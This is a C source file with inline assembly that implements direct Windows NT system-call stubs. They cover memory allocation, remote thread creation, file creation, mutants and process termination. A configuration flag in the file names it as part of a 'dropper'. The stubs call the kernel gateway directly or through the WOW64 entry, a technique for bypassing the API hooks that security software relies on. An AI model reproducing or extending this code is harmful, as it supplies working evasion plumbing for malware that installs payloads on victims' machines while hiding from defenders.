#include <config.h>
#include <fastcall.h>
#include <ntapi.h>
#include "ntapi.h"

enum {
    TEB32_WOW64RESERVED = FIELD_OFFSET(TEB32, WOW32Reserved)
};

#if SCFG_DROPPER_NTAPI_INIT_USE_PROCLOAD == ON
    #define NTAPI_STUB_SOURCE(FUNCTION_INDEX, ARGSIZE)                                \
        {                                                                             \
            __asm { jmp dword ptr NtapiSyscallsAddressStorage[FUNCTION_INDEX << 2] }; \
        }
#else
    #define NTAPI_STUB_SOURCE(FUNCTION_INDEX, ARGSIZE)                                     \
        {                                                                                  \
            __asm { test byte ptr [Config.NtVersion.bIsDeprecated], TRUE                }; \
            __asm { jz L1                                                               }; \
            __asm { jmp dword ptr NtapiSyscallsAddressStorage[FUNCTION_INDEX << 2]      }; \
        L1:                                                                                \
            __asm { mov edx, offset KiFastSystemCall                                    }; \
            __asm { mov eax, dword ptr NtapiSyscallsAddressStorage[FUNCTION_INDEX << 2] }; \
            __asm { test byte ptr [Config.Cpu.bUnderWow64], TRUE                        }; \
            __asm { cmovnz edx, dword ptr fs:[TEB32_WOW64RESERVED]                      }; \
            __asm { call edx                                                            }; \
            __asm { ret ARGSIZE                                                         }; \
        }
#endif

PRAGMA_WARNING_DISABLE_PUSH(869) // parameter "X" was never referenced

NTSTATUS
NTAPISTUB
NtAllocateVirtualMemory(
    IN HPROCESS  ProcessHandle,
    IO PVOID    *BaseAddress,
    IN ULONG_PTR ZeroBits,
    IO PSIZE_T   RegionSize,
    IN ULONG     AllocationType,
    IN ULONG     Protect
    )
{
	NTAPI_STUB_SOURCE(__COUNTER__, 0x18);
}

NTSTATUS
NTAPISTUB
NtFreeVirtualMemory(
    IN HPROCESS ProcessHandle,
    IN PVOID   *BaseAddress,
    IO PSIZE_T  RegionSize,
    IN ULONG    FreeType
    )
{
    NTAPI_STUB_SOURCE(__COUNTER__, 0x10);
}

NTSTATUS
NTAPISTUB
NtCreateThreadEx(
    OUT PHTRHEAD    hThread,
    IN  ACCESS_MASK DesiredAccess,
    IN  PVOID       ObjectAttributes,
    IN  HPROCESS    ProcessHandle,
    IN  PTHREAD_START_ROUTINE pStartAddress,
    IN  PVOID       pParameter,
    IN  BOOL        CreateSuspended,
    IN  ULONG       StackZeroBits,
    IN  ULONG       SizeOfStackCommit,
    IN  ULONG       SizeOfStackReserve,
    OUT PVOID       pBytesBuffer
    )
{
    NTAPI_STUB_SOURCE(__COUNTER__, 0x2C);
}

NTSTATUS
NTAPISTUB
NtCreateFile(
    OUT PHANDLE            FileHandle,
    IN  ACCESS_MASK        DesiredAccess,
    IN  POBJECT_ATTRIBUTES ObjectAttributes,
    OUT PIO_STATUS_BLOCK   IoStatusBlock,
    IN  PLARGE_INTEGER     AllocationSize,
    IN  ULONG              FileAttributes,
    IN  ULONG              ShareAccess,
    IN  ULONG              CreateDisposition,
    IN  ULONG              CreateOptions,
    IN  PVOID              EaBuffer,
    IN  ULONG              EaLength
    )
{
    NTAPI_STUB_SOURCE(__COUNTER__, 0x2C);
}

NTSTATUS
NTAPISTUB
NtClose(
    IN HANDLE Handle
    )
{
    NTAPI_STUB_SOURCE(__COUNTER__, 0x04);
}

NTSTATUS
NTAPISTUB
NtCreateMutant(
    OUT    PHANDLE             MutantHandle,
    IN     ACCESS_MASK         DesiredAccess,
    IN OPT POBJECT_ATTRIBUTES  ObjectAttributes,
    IN     BOOLEAN             InitialOwner
    )
{
    NTAPI_STUB_SOURCE(__COUNTER__, 0x10);
}

NTSTATUS
NTAPISTUB
NtOpenMutant(
    OUT PHANDLE            MutantHandle,
    IN  ACCESS_MASK        DesiredAccess,
    IN  POBJECT_ATTRIBUTES ObjectAttributes
    )
{
    NTAPI_STUB_SOURCE(__COUNTER__, 0x0C);
    
}

NTSTATUS
NTAPISTUB
NtTerminateProcess(
    IN OPT HANDLE   ProcessHandle,
    IN     NTSTATUS ExitStatus
    )
{
    NTAPI_STUB_SOURCE(__COUNTER__, 0x08);
}

PRAGMA_WARNING_DISABLE_POP(869)
